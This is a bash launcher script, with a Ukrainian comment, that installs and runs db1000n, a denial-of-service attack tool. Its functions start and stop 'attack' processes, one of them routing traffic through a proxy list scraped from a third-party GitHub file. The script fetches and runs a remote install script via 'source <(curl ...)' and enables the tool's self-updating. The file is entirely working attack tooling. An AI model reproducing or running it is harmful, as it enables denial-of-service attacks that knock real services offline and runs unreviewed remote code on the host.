#!/bin/bash


#checking for installation
#виконавча програма
EXEDir=db1000n
EXE=db1000n


############### functions ##################################

function statusAttackCommand {

    pgrep -x "$EXE" > /dev/null; echo $(($?==0));

}

function startAttackProxyCommand {

    ./$EXEDir/${EXE} -enable-self-update -self-update-check-frequency=1h -restart-on-update=false \
        	 --proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt") "\n") "," }}'&

}
 
function startAttackCommand {

    ./$EXEDir/${EXE} -enable-self-update -self-update-check-frequency=1h -restart-on-update=false&

}

function stopAttackCommand {

    pgrep -x "$EXE" | xargs kill -9; sleep 2s;  \

}


#some statistics
function exeInfoCommand { echo "version: $(expr "$(./$EXEDir/${EXE} --version 2>&1)" : '.*{.*"version": "\(.*\)", "pid".*}.*')"; }


############################################################


############### init #######################################

function initEXECommand {


    initEXECommandSucceeded=true

    if $forceExeReinstall ; then

        tput setaf 3; echo "Forcing exe reinstall -> will delete the folder $EXEDir";tput setaf 6
        rm -r "$EXEDir"

    fi

    if [ -d "$EXEDir" ]
    then
        echo ""
    else
        tput setaf 3; echo "Exe dir does not exist -> will create one";tput setaf 6
        mkdir $EXEDir
    fi

    #download and install the EXE if not available
    if [ -e "$EXEDir/$EXE" ]
    then
        tput setaf 3; echo "Application already downloaded";tput setaf 6
    else

        tput setaf 3; echo "Downloading the application";tput setaf 6

        tput setaf 6;

        cd $EXEDir;

        (source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh);) #IMPORTANT: use parentheses here to avoid some strange effects

        cd ..;

        #rm ${EXE}_*
        #sleep 2s;

        if [ -s $EXEDir/${EXE} ] ; then

            initEXECommandSucceeded=true

        else

            initEXECommandSucceeded=false

        fi
    fi

}

############################################################

